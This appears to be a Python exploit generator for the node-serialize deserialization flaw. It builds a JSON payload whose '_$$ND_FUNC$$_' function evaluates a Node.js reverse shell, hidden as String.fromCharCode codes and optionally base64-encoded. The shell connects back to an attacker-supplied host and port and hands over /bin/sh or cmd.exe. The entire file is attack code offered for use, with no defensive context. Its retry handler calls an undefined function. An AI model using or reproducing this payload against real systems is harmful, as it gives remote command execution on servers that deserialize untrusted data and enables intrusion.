import base64

def main(lhost,lport,params,encode = ""):
    revshell_payload_nodejs = '''
        if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
        function revshell() {
            lhost="%s";
            lport="%s";
            var client = new require('net').Socket();
            client.connect(lport, lhost, function() {
                var sh = require('child_process').spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
                client.pipe(sh.stdin);
                sh.stdout.pipe(client);
                sh.stderr.pipe(client);
            });
            client.on('error', function(e) {
                setTimeout(c(lhost,lport), 5000);
            });
        }
        revshell();
        ''' % (lhost, lport)
    payload = encode_ord(revshell_payload_nodejs)
    match encode:
        case "b64":
            ok = "{\"%s\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}" % (params,payload)
            print(base64.b64encode(ok.encode()).decode())
        case _:
            print("{\"%s\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}" % (params,payload))

def encode_ord(revshell_payload_nodejs):
    """String.CharCode"""
    encoded = ''
    for char in revshell_payload_nodejs:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]